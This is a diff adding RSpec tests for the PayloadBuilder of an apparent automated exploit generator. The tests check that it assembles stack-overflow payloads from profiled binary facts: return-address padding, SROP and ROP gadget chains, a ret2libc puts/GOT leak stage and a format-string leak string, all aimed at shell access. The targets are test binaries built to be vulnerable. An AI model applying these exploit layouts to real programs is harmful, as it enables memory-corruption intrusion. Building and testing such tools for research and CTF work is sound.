@@ -27,6 +27,56 @@ RSpec.describe Lictor::PayloadBuilder do
     expect(body).to eq(("A" * 16).b + [4_196_182].pack("Q<"))
   end
 
+  it "resolves sym:NAME+offset: the syscall tail behind a symbol" do
+    facts = "sym_addr(\"sigreturn_gadget\", 4198846).\n"
+    result = described_class.build(binary: binary, facts: facts, technique: "srop_probe",
+      out: out, packs: [double(build: {"technique" => "srop_probe",
+                                       "layout" => [[
+                                         "chain", "sym:sigreturn_gadget+7"
+                                       ]]})])
+    body = File.binread(out)
+    expect(body).to eq([4_198_853].pack("Q<"))
+    expect(result[:ret_source]).to include("sym_addr:sigreturn_gadget+7")
+  end
+
+  it "resolves gadget:TYPE+offset: the syscall tail behind the matched bytes" do
+    facts = "gadget(\"sigreturn\", 4198846).\n"
+    result = described_class.build(binary: binary, facts: facts, technique: "srop_probe",
+      out: out, packs: [double(build: {"technique" => "srop_probe",
+                                       "layout" => [[
+                                         "chain", "gadget:sigreturn+7"
+                                       ]]})])
+    body = File.binread(out)
+    expect(body).to eq([4_198_853].pack("Q<"))
+    expect(result[:ret_source]).to include("gadget:sigreturn+7")
+  end
+
+  it "builds the ret2libc leak stage when no leak facts ride yet" do
+    # the two-stage shape: without leaked facts the builder emits the
+    # leak round (puts(GOT[puts]) rides out raw) - the strike derives
+    # from what answers
+    facts = "vuln(\"sof\").\nnx(\"true\").\npie(\"true\").\n" \
+            "gadget(\"ret_align\", 4122).\ngadget(\"pop_rdi_ret\", 4529).\n" \
+            "plt_addr(\"puts\", 4215).\ngot_addr(\"puts\", 4096).\n"
+    result = described_class.build(binary: binary, facts: facts, technique: "ret2libc", out: out)
+    body = File.binread(out)
+    expect(body).to start_with("A" * 16)
+    expect(body).to include([4529].pack("Q<") + [4096].pack("Q<") + [4215].pack("Q<"))
+    expect(result[:variant]).to eq("leak_stage")
+  end
+
+  it "builds the fmtstr leak format off the fmt_offset fact - no measured offset" do
+    # the fmtstr class has no return-slot padding to measure: the leak
+    # format string comes straight from the profiler's fmt_offset
+    bin = ProfilerBinaryBuilder.printf_stack
+    facts = "vuln(\"fmtstr\").\nfmtstr_read(\"true\").\nfmt_offset(\"6\").\n"
+    result = described_class.build(binary: bin, facts: facts, technique: "fmtstr_leak", out: out)
+    body = File.binread(out)
+    expect(body).to start_with("%6$p %7$p")
+    expect(body).to end_with("|")
+    expect(result[:offset]).to be_nil
+  end
+
   it "builds the shellcode payload: sled + the banner leak + the encoded stub" do
     facts = "nx(\"false\").\nleaked_address(\"buf\", 140730103547632).\n"
     result = described_class.build(binary: binary, facts: facts, technique: "shellcode", out: out)
@@ -269,5 +319,98 @@ RSpec.describe Lictor::PayloadBuilder, "the shellcode ret slot without the banne
     out = File.join(dir, "p.bin")
     expect { described_class.build(binary: binary, facts: facts, technique: "shellcode", out: out) }
       .to raise_error(Lictor::PayloadBuilder::BuildError, /leaked_address\("buf"\)/)
+  end
+end
+
+RSpec.describe Lictor::PayloadBuilder, "the sym:NAME reference" do
+  let(:dir) { Dir.mktmpdir }
+  let(:binary) { ProfilerBinaryBuilder.vulnerable }
+
+  it "resolves a static twin's stage function from its sym_addr fact" do
+    out = File.join(dir, "p.bin")
+    facts = "nx(\"true\").\npie(\"false\").\nsym_addr(\"vault_arm\", 4199099).\n"
+    pack = Augure::Pack.load_hash(
+      "technique" => "static_stage_probe", "author" => "spec", "source" => "https://example.com",
+      "rules" => [{"id" => "app_ssp", "head" => %w[applicable static_stage_probe],
+                   "conditions" => [%w[fact pie false]]}],
+      "kb" => [{"id" => "s1", "description" => "s", "success_rate" => 0.5}],
+      "mcts" => {"requires" => [], "provides" => %w[shell], "terminal" => true, "success" => 0.5},
+      "priors" => [1, 1],
+      "build" => {"technique" => "static_stage_probe",
+                  "layout" => [["padding"], ["qword", "sym:vault_arm"]]}
+    )
+    result = described_class.build(binary: binary, facts: facts,
+      technique: "static_stage_probe", out: out, packs: [pack])
+    expect(File.binread(out)).to eq(("A" * 16).b + [4_199_099].pack("Q<"))
+    expect(result[:ret_source]).to eq("sym_addr:vault_arm@4199099")
+  end
+
+  it "refuses a symbol the profiler never recorded" do
+    out = File.join(dir, "p.bin")
+    facts = "nx(\"true\").\npie(\"false\").\nsym_addr(\"probe\", 4199051).\n"
+    pack = Augure::Pack.load_hash(
+      "technique" => "static_stage_probe", "author" => "spec", "source" => "https://example.com",
+      "rules" => [{"id" => "app_ssp", "head" => %w[applicable static_stage_probe],
+                   "conditions" => [%w[fact pie false]]}],
+      "kb" => [{"id" => "s1", "description" => "s", "success_rate" => 0.5}],
+      "mcts" => {"requires" => [], "provides" => %w[shell], "terminal" => true, "success" => 0.5},
+      "priors" => [1, 1],
+      "build" => {"technique" => "static_stage_probe",
+                  "layout" => [["padding"], ["qword", "sym:vault_arm"]]}
+    )
+    expect do
+      described_class.build(binary: binary, facts: facts,
+        technique: "static_stage_probe", out: out, packs: [pack])
+    end.to raise_error(Lictor::PayloadBuilder::BuildError, /sym_addr\("vault_arm"\)/)
+  end
+end
+
+RSpec.describe Lictor::PayloadBuilder, "the layout variants walk" do
+  let(:dir) { Dir.mktmpdir }
+  let(:binary) { ProfilerBinaryBuilder.vulnerable }
+
+  def variant_pack(technique, variants)
+    Augure::Pack.load_hash(
+      "technique" => technique, "author" => "spec", "source" => "https://example.com",
+      "rules" => [{"id" => "app_#{technique}", "head" => ["applicable", technique],
+                   "conditions" => [%w[fact pie false]]}],
+      "kb" => [{"id" => "v1", "description" => "v", "success_rate" => 0.5}],
+      "mcts" => {"requires" => [], "provides" => %w[shell], "terminal" => true, "success" => 0.5},
+      "priors" => [1, 1],
+      "build" => {"technique" => technique, "variants" => variants}
+    )
+  end
+
+  it "builds with the first variant whose references the facts satisfy" do
+    out = File.join(dir, "p.bin")
+    facts = "nx(\"true\").\npie(\"false\").\n" \
+            "gadget(\"pop_rdi_rsi_rdx_ret\", 4198998).\nsym_addr(\"vault_arm\", 4199099).\n"
+    pack = variant_pack("twin_probe", [
+      {"name" => "plt_csu",
+       "layout" => [["padding"], ["chain", "gadget:pop_rdi_ret", "plt_addr:callme_one"]]},
+      {"name" => "static_stages",
+       "layout" => [["padding"],
+         ["chain", "gadget:pop_rdi_rsi_rdx_ret", "sym:vault_arm", "const:41"]]}
+    ])
+    result = described_class.build(binary: binary, facts: facts,
+      technique: "twin_probe", out: out, packs: [pack])
+    expect(result[:variant]).to eq("static_stages")
+    expect(File.binread(out)).to eq(("A" * 16).b + [4_198_998, 4_199_099, 41].pack("Q<*"))
+  end
+
+  it "names every variant and its reason when none matches the facts" do
+    out = File.join(dir, "p.bin")
+    facts = "nx(\"true\").\npie(\"false\").\nwin_symbol(\"win\", 4196182).\n"
+    pack = variant_pack("twin_probe", [
+      {"name" => "plt_csu",
+       "layout" => [["padding"], ["chain", "gadget:pop_rdi_ret", "plt_addr:callme_one"]]},
+      {"name" => "static_stages",
+       "layout" => [["padding"], ["chain", "gadget:pop_rdi_rsi_rdx_ret", "sym:vault_arm"]]}
+    ])
+    expect do
+      described_class.build(binary: binary, facts: facts,
+        technique: "twin_probe", out: out, packs: [pack])
+    end.to raise_error(Lictor::PayloadBuilder::BuildError,
+      /plt_csu: .*pop_rdi_ret.*static_stages: .*pop_rdi_rsi_rdx_ret/m)
   end
 end
